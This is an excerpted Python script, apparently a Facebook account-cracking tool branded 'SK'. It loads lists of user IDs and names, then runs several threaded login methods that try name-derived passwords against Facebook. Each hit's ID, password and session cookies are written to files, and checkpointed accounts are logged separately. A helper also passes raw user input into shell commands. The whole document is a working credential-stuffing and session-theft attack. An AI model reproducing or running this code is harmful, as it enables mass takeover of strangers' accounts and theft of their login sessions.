...
from concurrent.futures import ThreadPoolExecutor as shivSK
from string import * 
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SK Menu ")
        exit()
...
def shiv():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://https://chat.whatsapp.com/BigBlH5kzOiLnfZAkFyoS9')
        pass
    elif select =='F':
        os.system('xdg-open https:https://www.facebook.com/shiv.mahato.9047?mibextid=ZbWKwL')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SK(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SK] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SKb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SKb};{ckkk}"
                    print(f"\r{R} [SK-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SK_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SK_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SK-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SK_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SK-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SK_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SK_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SK-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SK] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SK] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SK-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SK_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            pw = []
            clear()
            print('PUT lLIMIT BETWEEN 1 TO 30')
            ...
            print(47*"-")
            with shivSK(max_workers=30) as SKworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SKworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SKworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SKworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SKworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SK.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SK.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SK = input('Put File Name :')
    print(" ")
    shiv = input('Saving Put File Name :')
    os.system('touch ' +shiv)
    os.system('sort -r '+sk+' | uniq > '+shiv)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + sk )
    print(47*'-')
    print("File Saved To :" + shiv )
    print(47*'-')
    input(f"{S} Press Enter To Back SK Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SK.txt\n') 
        filepath = input("Put File Name: ")
